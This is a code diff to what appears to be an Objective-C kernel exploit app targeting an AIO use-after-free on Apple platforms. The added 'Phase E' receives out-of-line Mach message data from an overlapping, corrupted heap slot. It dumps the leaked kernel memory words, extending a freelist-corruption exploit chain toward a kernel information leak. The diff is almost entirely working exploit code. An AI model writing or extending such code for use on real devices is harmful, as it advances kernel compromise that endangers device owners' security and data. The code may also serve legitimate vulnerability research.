@@ -17,6 +17,7 @@
 #import <sys/time.h>
 #import <unistd.h>
 #include <aio.h>
+#include <errno.h>
 #include <sys/event.h>
 #include <mach/thread_policy.h>
 #include <pthread.h>
@@ -5977,7 +5978,31 @@ static int _aioUafRunning = 0;
                 [self appendLog:@"  *** Freelist corruption active — overlapping alloc works ***"];
             } else if (e1state == EFAULT) {
                 [self appendLog:@"  *** E1 EFAULT — OOL corrupted E1's buf/fd fields ***"];
-                [self appendLog:@"  *** Overlap likely occurring but corrupting wrong offset ***"];
+                [self appendLog:@"  *** Overlap confirmed — now reading slot contents ***"];
+
+                // ---- Phase E: Receive overlap msg to map kernel slot data ----
+                [self appendLog:@"\n--- Phase E: Dump OOL from overlapPort ---"];
+                {
+                    DrainMsg eRcv;
+                    memset(&eRcv, 0, sizeof(eRcv));
+                    kern_return_t ekr = mach_msg(&eRcv.header, MACH_RCV_MSG, 0, sizeof(DrainMsg),
+                                                  overlapPort, 0, MACH_PORT_NULL);
+                    [self appendLog:[NSString stringWithFormat:@"  E: recv from overlapPort kr=%d", ekr]];
+                    if (ekr == MACH_MSG_SUCCESS && eRcv.ool.address != NULL) {
+                        uint8_t *d = (uint8_t *)eRcv.ool.address;
+                        int sz = eRcv.ool.size;
+                        [self appendLog:[NSString stringWithFormat:@"  E: OOL addr=%p size=%d", eRcv.ool.address, sz]];
+                        int words = (sz < 256 ? sz : 256) / 8;
+                        for (int i = 0; i < words; i++) {
+                            uint64_t v = *(uint64_t *)(d + i * 8);
+                            // Highlight non-zero values (kernel-written fields)
+                            [self appendLog:[NSString stringWithFormat:@"  +0x%02x: 0x%016llx%s", i * 8, v,
+                                              (v != 0 && v != 0xAA00000000000000ULL) ? " ***" : ""]];
+                        }
+                    } else {
+                        [self appendLog:[NSString stringWithFormat:@"  E: recv failed or NULL addr (addr=%p)", eRcv.ool.address]];
+                    }
+                }
             } else if (e1state == 0) {
                 [self appendLog:@"  E1 valid — OOL did not hit same slot (magazine drain insufficient)"];
                 aio_return(&e1);
